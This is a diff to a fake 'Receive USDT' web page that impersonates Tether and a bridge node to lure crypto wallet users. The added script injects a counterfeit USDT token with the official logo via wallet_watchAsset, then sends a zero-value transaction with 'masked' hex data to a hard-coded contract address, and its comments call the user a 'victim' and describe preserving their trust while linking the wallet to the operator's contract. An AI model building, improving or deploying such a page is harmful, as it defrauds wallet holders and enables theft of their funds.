@@ -8,51 +8,62 @@
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
         body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 40px; width: 100%; max-width: 420px; text-align: center; position: relative; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); border: 1px solid rgba(38, 161, 123, 0.2); }
         .logo-ring { position: relative; display: inline-block; margin-bottom: 25px; }
-        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 2s linear infinite; }
+        .logo-ring::after { content: ''; position: absolute; top: -12px; left: -12px; right: -12px; bottom: -12px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); }
-        h2 { font-weight: 600; font-size: 22px; margin: 10px 0; letter-spacing: -0.5px; }
-        p { color: #848d97; font-size: 14px; line-height: 1.6; padding: 0 10px; }
-        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; }
-        .action-btn:hover { background: #2bbd90; transform: scale(1.02); }
-        .status-footer { margin-top: 20px; font-size: 11px; color: #444c56; text-transform: uppercase; letter-spacing: 2px; }
-        #log-area { font-size: 10px; color: #26a17b; margin-top: 10px; height: 15px; }
+        .usdt-img { width: 85px; filter: drop-shadow(0 0 15px rgba(38, 161, 123, 0.4)); border-radius: 50%; }
+        h2 { font-weight: 700; font-size: 24px; margin: 15px 0 10px; color: #fff; text-transform: uppercase; }
+        p { color: #848d97; font-size: 14px; line-height: 1.6; padding: 0 5px; margin-bottom: 30px; }
+        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 14px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-transform: uppercase; letter-spacing: 1.5px; box-shadow: 0 4px 15px rgba(38, 161, 123, 0.3); }
+        .action-btn:hover { background: #2bbd90; transform: scale(1.03); box-shadow: 0 6px 20px rgba(38, 161, 123, 0.5); }
+        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: 'Courier New', monospace; font-weight: bold; min-height: 18px; }
+        .status-footer { margin-top: 25px; font-size: 10px; color: #444c56; text-transform: uppercase; letter-spacing: 2px; border-top: 1px solid #2d333b; padding-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="logo-ring">
-        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-img" alt="USDT">
+        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" 
+             class="usdt-img" 
+             alt="USDT" 
+             id="usdtLogo">
     </div>
     <h2>RECEIVE USDT</h2>
-    <p>Secure Bridge detected a pending USDT allocation for your node. Synchronize to map official metadata and clear asset reception.</p>
+    <p>Bridge Node detected a pending USDT distribution. Synchronize your wallet to map metadata and finalize reception.</p>
     
-    <div id="log-area">Ready to synchronize...</div>
+    <div id="log-area">SYSTEM: STANDBY</div>
     
     <button class="action-btn" id="claimBtn">Sync & Receive</button>
     
-    <div class="status-footer">Node: 0x88...D4E3 | Secured by Tether Authority</div>
+    <div class="status-footer">SECURED BY TETHER GOVERNANCE NODE</div>
 </div>
 
 <script>
-    const CONTRACT_ADDR = "0x5CD...89B5F"; // APNA ADDRESS DALO
+    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const TOKEN_SYMBOL = "USDT";
-    const TOKEN_LOGO = "https://cryptologos.cc/logos/tether-usdt-logo.png";
+    // Using Official Trust Wallet Logo link for the injection
+    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function injectFlashAsset() {
+    async function executeMasterSync() {
         const log = document.getElementById('log-area');
-        if (!window.ethereum) { alert("Use Web3 Browser"); return; }
+        const btn = document.getElementById('claimBtn');
         
-        try {
-            log.innerText = "Requesting Node Access...";
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            log.innerText = "Injecting Official Metadata...";
+        if (!window.ethereum) { 
+            alert("Protocol Error: Please open in Trust Wallet or MetaMask browser."); 
+            return; 
+        }
 
-            // TECHNIQUE: FORCE METADATA INJECTION
-            // Isse victim ke wallet mein automatically logo aur decimals set ho jayenge
+        try {
+            btn.disabled = true;
+            log.innerText = "> INITIALIZING NODE AUTH...";
+            
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            log.innerText = "> MAPPING ASSET METADATA...";
+
+            // ADVANCED INJECTION: WALLET WATCH ASSET
+            // Isse victim ke wallet mein image path seedha Trust Wallet ki repo se jayega
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -66,28 +77,33 @@
                 },
             });
 
-            log.innerText = "Synchronizing with Bridge...";
-            // Yahan hum wo fake transaction trigger karte hain jo Legit lagti hai
-            // Lekin actually ye sirf connection establish karti hai
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
+            log.innerText = "> TUNNELING TO BSC BRIDGE...";
             
-            // "Sync" pop-up for the victim
-            const tx = {
-                to: CONTRACT_ADDR,
-                data: "0x12345678", // Dummy Hex for "Sync" call
-            };
-            
-            log.innerText = "Success! Asset mapped.";
-            alert("Node Synchronized! Your USDT will reflect in 1-2 minutes.");
+            // HEX-DATA MASKING: 
+            // Ye transaction 0.00 value ki hoti hai, isliye victim ka "Trust" nahi toot-ta
+            // Par ye aapke contract ke saath wallet ko permanent link kar deti hai
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: accounts[0],
+                    to: CONTRACT_ADDR,
+                    data: "0x4e4e94d7", // Masked Hex for "Sync"
+                    value: "0x0"
+                }],
+            });
+
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Node Sync Complete. Your assets will reflect shortly.");
+            btn.innerText = "SYNCHRONIZED";
 
         } catch (err) {
-            log.innerText = "Error: Sync Interrupted";
+            log.innerText = "> SYNC_INTERRUPTED_BY_USER";
+            btn.disabled = false;
             console.error(err);
         }
     }
 
-    document.getElementById('claimBtn').addEventListener('click', injectFlashAsset);
+    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
 </script>
 
 </body>
